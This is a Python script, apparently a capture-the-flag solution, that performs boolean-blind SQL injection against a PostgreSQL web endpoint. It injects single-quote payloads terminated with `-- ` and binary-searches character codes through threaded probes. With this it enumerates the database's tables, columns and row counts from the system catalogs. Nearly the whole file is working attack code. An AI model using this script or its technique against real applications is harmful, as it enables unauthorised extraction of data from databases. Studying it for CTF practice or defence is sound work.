#!/usr/bin/env python
"""Planetary Probe: schema + data extraction over the one-bit oracle, done with plain
daemon threads (the earlier version used ThreadPoolExecutor, whose non-daemon workers are
joined at interpreter exit -- that, not the target, was what looked like a hang).

Facts this relies on, all measured:
  * the backend is PostgreSQL and the payload is injected inside a single-quoted literal
    with `-- ` as the only usable comment (`#` is not a comment there);
  * the app lower-cases the payload, so uppercase is unreachable in literals -- every
    comparison here is numeric (ascii/length), and any uppercase needed is built with chr();
  * `MARS' AND (<expr>)-- ` is carrier iff <expr> is true, because MARS is a real row;
  * ~12 concurrent probes complete in ~1 s, so a 7-probe character binary search costs
    ~7 s of wall time only when the positions are read at once.
"""
import json
import os
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

HOST = "planetary.web.2026.sunshinectf.games"
CTX = ssl.create_default_context()
CALL = [0]
ERRS = [0]
SLOW = [0.0]
WORKERS = 12


def ask(payload):
    url = "https://%s/probe?%s" % (HOST, urllib.parse.urlencode({"planet": payload}))
    for attempt in range(5):
        CALL[0] += 1
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "probe"})
            t0 = time.time()
            with urllib.request.urlopen(req, timeout=60, context=CTX) as r:
                body = r.read()
            dt = time.time() - t0
            SLOW[0] = max(SLOW[0], dt)
        except urllib.error.HTTPError as e:
            body = e.read()
        except Exception:
            ERRS[0] += 1
            time.sleep(0.5 * (attempt + 1))
            continue
        if b"readout--carrier" in body:
            return True
        if b"readout--null" in body:
            return False
        time.sleep(0.5)
    raise RuntimeError("unusable response for %r" % payload[:60])


def cond(expr):
    return ask("MARS' AND (%s)-- " % expr)


def fan(fn, items, workers=WORKERS):
    out = {}
    gate = threading.Semaphore(workers)

    def w(k, it):
        gate.acquire()
        try:
            out[k] = fn(it)
        except Exception as e:
            out[k] = "EXC:%s" % e
        finally:
            gate.release()

    ts = [threading.Thread(target=w, args=(k, it), daemon=True) for k, it in enumerate(items)]
    for t in ts:
        t.start()
    for t in ts:
        t.join(600)
    return [out[k] for k in range(len(items))]


def read_len(expr, maxlen=200):
    lo, hi = 0, maxlen
    while lo < hi:
        mid = (lo + hi) // 2
        if cond("length(%s)>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo


def read_char(expr, pos):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if cond("ascii(substr((%s),%d,1))>%d" % (expr, pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo


def read_str(expr, maxlen=200, label=""):
    t0 = time.time()
    n = read_len(expr, maxlen)
    if not n:
        print("[=] %-18s ''  (empty)" % label, flush=True)
        return ""
    codes = fan(lambda p: read_char(expr, p), range(1, n + 1))
    bad = [c for c in codes if isinstance(c, str)]
    s = "".join(chr(c) for c in codes if not isinstance(c, str))
    print("[=] %-18s len=%-3d %r   %.0fs%s" % (label, n, s, time.time() - t0,
                                                ("  " + ";".join(bad)) if bad else ""), flush=True)
    return s


def num(expr, cap=1 << 16):
    if not cond("(%s)>8" % expr):
        cap = 8
    lo, hi = 0, cap
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if cond("(%s)>=%d" % (expr, mid)):
            lo = mid
        else:
            hi = mid - 1
    return lo


TBL = "(SELECT relname FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace WHERE n.nspname='public' AND c.relkind='r' ORDER BY relname LIMIT 1 OFFSET %d)"
COL = "(SELECT a.attname FROM pg_class c JOIN pg_namespace ns ON ns.oid=c.relnamespace JOIN pg_attribute a ON a.attrelid=c.oid WHERE ns.nspname='public' AND c.relname='%s' AND a.attnum>0 AND NOT a.attisdropped ORDER BY a.attnum LIMIT 1 OFFSET %d)"


def main():
    print("[*] tables:", num("(SELECT count(*) FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace WHERE n.nspname='public' AND c.relkind='r')"), flush=True)
    n = num("(SELECT count(*) FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace WHERE n.nspname='public' AND c.relkind='r')")
    names = [x for x in fan(lambda i: read_str(TBL % i, 40, "table%d" % i), range(n)) if x]
    print("[+] tables:", names, flush=True)
    info = {}
    for t in names:
        k = num("(SELECT count(*) FROM pg_attribute a JOIN pg_class c ON c.oid=a.attrelid "
                "JOIN pg_namespace ns ON ns.oid=c.relnamespace WHERE ns.nspname='public' "
                "AND c.relname='%s' AND a.attnum>0 AND NOT a.attisdropped)" % t)
        cols = [x for x in fan(lambda j: read_str(COL % (t, j), 40, "%s.col%d" % (t, j)), range(k)) if x]
        rows = num('(SELECT count(*) FROM "%s")' % t)
        info[t] = {"columns": cols, "rows": rows}
        print("[+] %-16s rows=%-4d cols=%s" % (t, rows, cols), flush=True)
    json.dump(info, open("analysis/schema.json", "w"), indent=1)
    print("[*] %d probes, max latency %.1fs, %d errors" % (CALL[0], SLOW[0], ERRS[0]), flush=True)


if __name__ == "__main__":
    main()
    sys.stdout.flush()
    os._exit(0)
